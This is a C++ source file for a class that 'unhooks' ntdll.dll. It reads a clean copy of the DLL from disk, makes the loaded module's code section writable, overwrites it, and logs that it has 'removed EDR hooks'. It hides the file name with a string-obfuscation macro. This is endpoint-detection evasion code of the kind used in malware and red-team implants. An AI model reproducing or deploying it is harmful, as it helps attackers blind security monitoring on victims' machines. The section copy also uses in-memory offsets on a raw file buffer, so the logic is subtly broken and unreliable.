#include "../include/Unhooking.h"
#include "../include/StringObfuscation.h"
#include <iostream>

using namespace std;

PVOID NTDLLUnhooker::LoadFreshNTDLL()
{
    CHAR ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    const char *ntdllName = OBFUSCATE("\\ntdll.dll");
    lstrcatA(ntdllPath, ntdllName);

#ifdef _DEBUG
    wcout << L"[Unhook] Loading fresh ntdll from: " << (const char *)ntdllPath << endl;
#endif

    HANDLE hFile = CreateFileA(
        ntdllPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        return NULL;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    PVOID freshNtdll = VirtualAlloc(
        NULL,
        fileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (!freshNtdll)
    {
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, freshNtdll, fileSize, &bytesRead, NULL))
    {
        VirtualFree(freshNtdll, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    return freshNtdll;
}

BOOL NTDLLUnhooker::FindTextSection(PVOID moduleBase, PVOID *textStart, SIZE_T *textSize)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return FALSE;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE *)moduleBase + dosHeader->e_lfanew);

    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        return FALSE;
    }

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        if (memcmp(section[i].Name, ".text", 5) == 0)
        {
            *textStart = (BYTE *)moduleBase + section[i].VirtualAddress;
            *textSize = section[i].Misc.VirtualSize;
            return TRUE;
        }
    }

    return FALSE;
}

BOOL NTDLLUnhooker::RestoreTextSection(PVOID hookedNtdll, PVOID freshNtdll)
{
    PVOID hookedText, freshText;
    SIZE_T hookedSize, freshSize;

    if (!FindTextSection(hookedNtdll, &hookedText, &hookedSize))
    {
        return FALSE;
    }

    if (!FindTextSection(freshNtdll, &freshText, &freshSize))
    {
        return FALSE;
    }

    if (freshSize < hookedSize)
    {
        hookedSize = freshSize;
    }

    DWORD oldProtect;
    if (!VirtualProtect(hookedText, hookedSize, PAGE_EXECUTE_READWRITE, &oldProtect))
    {
        return FALSE;
    }

    DWORD hooksFound = 0;
    BYTE *hookedBytes = (BYTE *)hookedText;
    BYTE *freshBytes = (BYTE *)freshText;

    for (SIZE_T i = 0; i < hookedSize; i++)
    {
        if (hookedBytes[i] != freshBytes[i])
        {
            hooksFound++;
        }
    }

#ifdef _DEBUG
    if (hooksFound > 0)
    {
        wcout << L"[Unhook] Detected " << hooksFound << L" hooked bytes" << endl;
    }
#endif

    memcpy(hookedText, freshText, hookedSize);

    DWORD temp;
    VirtualProtect(hookedText, hookedSize, oldProtect, &temp);
    FlushInstructionCache(GetCurrentProcess(), hookedText, hookedSize);

    return TRUE;
}

BOOL NTDLLUnhooker::UnhookNTDLL(UNHOOK_RESULT *result)
{
#ifdef _DEBUG
    wcout << L"[Unhook] Starting NTDLL unhooking..." << endl;
#endif

    result->success = FALSE;
    result->hooksFound = 0;
    result->hooksRemoved = 0;
    result->bytesRestored = 0;

    HMODULE hookedNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hookedNtdll)
    {
        return FALSE;
    }

    PVOID freshNtdll = LoadFreshNTDLL();
    if (!freshNtdll)
    {
        return FALSE;
    }

    if (RestoreTextSection(hookedNtdll, freshNtdll))
    {
        result->success = TRUE;
#ifdef _DEBUG
        wcout << L"[Unhook] Successfully removed EDR hooks" << endl;
#endif
    }

    VirtualFree(freshNtdll, 0, MEM_RELEASE);

    return result->success;
}